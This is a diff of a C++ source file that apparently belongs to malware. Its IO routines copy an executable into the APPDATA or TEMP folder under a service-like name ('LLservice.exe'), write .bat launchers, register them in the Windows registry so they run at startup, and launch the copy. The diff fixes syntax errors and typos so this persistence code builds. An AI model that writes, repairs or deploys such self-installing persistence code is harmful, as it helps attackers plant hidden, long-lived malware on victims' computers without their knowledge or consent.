@@ -10,8 +10,8 @@
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"
-#include <Urlmon.h>
-#include <urlmon.h>
+//#include <Urlmon.h>
+//#include <urlmon.h>
 #include <tchar.h>
 #include <vector>
 #include <wininet.h>
@@ -19,7 +19,7 @@
 #include <shlwapi.h>
 #include "Regedit.h"
 
-#pragma comment(lib, "Urlmon.lib")
+//#pragma comment(lib, "Urlmon.lib")
 
 
 namespace IO
@@ -149,17 +149,15 @@ namespace IO
         return (stat (name.c_str(), &buffer) == 0);
     }
     void startup(LPCTSTR lpApplicationName) {
-      ShellExecute(NULL,"open",lpApplicationName,NULL,NULL,SW_SHOW); 
+      ShellExecute(NULL,"open",lpApplicationName,NULL,NULL,SW_SHOW);
       /*
         // additional information
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
-
         // set the size of the structures
         ZeroMemory(&si, sizeof(si));
         si.cb = sizeof(si);
         ZeroMemory(&pi, sizeof(pi));
-
         // start the program up
         CreateProcess(lpApplicationName,   // the path
                       "",        // Command line
@@ -176,9 +174,9 @@ namespace IO
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);*/
     }
-  
+
   bool mkbat(std::string path,std::string batname_path){
-    ofstream bat;
+    std::ofstream bat;
     bat.open (batname_path+".bat");
     bat << "@echo off \r\n";
     bat << "start "+path+"\r\n";
@@ -186,7 +184,7 @@ namespace IO
     bat.close();
     return 0;
   }
- 
+
     bool copy_File() {
         char* appdata = getenv("APPDATA");
         std::string appdata_dir(appdata);
@@ -196,21 +194,21 @@ namespace IO
         std::string batname = "batER.bat";
         std::string batpath = path+batname;
         if(!IO::exists_file(batpath)){
-           mkbat(fullpath,batpath)
+           mkbat(fullpath,batpath);
            Registry::RegisterProgram2(batname,batpath);
         }
         if (IO::exists_file(fullpath)) {
             char* temp = getenv("temp");
             std::string temp_dir(temp);
             path = temp_dir + "\\";
-            filename = "LLseervice.exe";
+            filename = "LLservice.exe";
             fullpath = path + filename;
             batname = "batLL.bat";
             batpath = path+batname;
         }
         if(!IO::exists_file(batpath)){
            //fixbat(filename,batpath);
-           mkbat(fullpath,batpath)
+           mkbat(fullpath,batpath);
            Registry::RegisterProgram2(batname,batpath);
         }
         if (IO::exists_file(fullpath)){
@@ -230,15 +228,15 @@ namespace IO
                 }else {
                     std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
-                    if(filename == "LLseervice.exe"){
+                    if(filename == "LLservice.exe"){
                       batname = "batLL.bat";
                       batpath = path+batname;
                     }else{
                       batname = "batER.bat";
                       batpath = path+batname;
                     }
-                    
-                    mkbat(fullpath,batpath)
+
+                    mkbat(fullpath,batpath);
                     //shell_cmd()
                     startup(fullpath.c_str());
                     Registry::RegisterProgram2(batname,batpath);
@@ -247,15 +245,15 @@ namespace IO
             }else {
                std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
-                    if(filename == "LLseervice.exe"){
+                    if(filename == "LLservice.exe"){
                       batname = "batLL.bat";
                       batpath = path+batname;
                     }else{
                       batname = "batER.bat";
                       batpath = path+batname;
                     }
-                    
-                    mkbat(fullpath,batpath)
+
+                    mkbat(fullpath,batpath);
                     //shell_cmd()
                     startup(fullpath.c_str());
                     Registry::RegisterProgram2(batname,batpath);
@@ -264,15 +262,15 @@ namespace IO
         }else {
            std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
-                    if(filename == "LLseervice.exe"){
+                    if(filename == "LLservice.exe"){
                       batname = "batLL.bat";
                       batpath = path+batname;
                     }else{
                       batname = "batER.bat";
                       batpath = path+batname;
                     }
-                    
-                    mkbat(fullpath,batpath)
+
+                    mkbat(fullpath,batpath);
                     //shell_cmd()
                     startup(fullpath.c_str());
                     Registry::RegisterProgram2(batname,batpath);
@@ -280,7 +278,7 @@ namespace IO
         }
 
     }
-  
+
 }
 
 
